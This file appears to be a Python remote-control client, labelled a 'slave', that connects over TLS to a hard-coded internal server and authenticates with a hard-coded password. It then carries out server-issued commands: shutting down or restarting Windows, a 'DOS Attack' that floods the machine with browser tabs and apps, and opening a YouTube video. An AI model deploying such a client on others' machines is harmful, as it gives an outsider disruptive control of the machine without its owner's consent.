import time
import socket
import os
import ssl
import logging

# Logging configuration
logging.basicConfig(filename="slave_log.log", level=logging.INFO, format="%(asctime)s - %(message)s")

# SSL configuration
context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
context.load_verify_locations("server_cert.pem")

def connect_to_server():
    while True:
        try:
            s = socket.socket()
            host = "10.250.14.55"
            port = 8080
            s = context.wrap_socket(s, server_hostname=host)
            s.connect((host, port))
            print("Connected to server")
            return s
        except socket.error as e:
            print(f"Connection failed: {e}. Retrying in 5 seconds...")
            time.sleep(5)

s = connect_to_server()

# Authentication
auth_request = s.recv(1024).decode()
if auth_request == "AUTH":
    s.sendall("securepassword".encode())  # Send password for authentication
    auth_status = s.recv(1024).decode()
    if "failed" in auth_status:
        print("Authentication failed. Closing connection.")
        s.close()
    else:
        print("Authenticated successfully with server.")
        logging.info("Authenticated successfully with server.")

        while True:
            command = s.recv(1024).decode()
            if command == "shutdown":
                print("Shutdown command")
                s.send("Command executed".encode())
                os.system("shutdown.exe /s /t 00")
                
            elif command == "restart":
                print("Restart command")
                s.send("Command executed".encode())
                os.system("shutdown.exe /r /t 00")
                
            elif command == "DOS Attack":
                print("DOS command initiated")
                s.send("Command executed".encode())
                
                urls = [
                    "https://youtu.be/dQw4w9WgXcQ",
                    "https://www.example.com",
                    "https://www.google.com",
                    "https://www.reddit.com",
                    "https://www.wikipedia.org"
                ]
                
                applications = ["notepad.exe", "calc.exe", "mspaint.exe"]
                
                for _ in range(5):
                    for url in urls:
                        os.system(f"start msedge.exe {url}")
                    for app in applications:
                        os.system(f"start {app}")
                    time.sleep(1)
                
            elif command == "Shantabhai":
                print("Shantabhai command initiated")
                s.send("Command executed".encode())
                
                urls = ["https://www.youtube.com/watch?v=Uk65cmPGl8s"]
                for url in urls:
                    os.system(f"start msedge.exe {url}")
                
            elif command == "exit":
                print("Disconnecting from server")
                s.close()
                break
            
            else:
                print("Unknown command received")
                s.send("Unknown command".encode())

else:
    print("No authentication request from server. Disconnecting.")
    s.close()
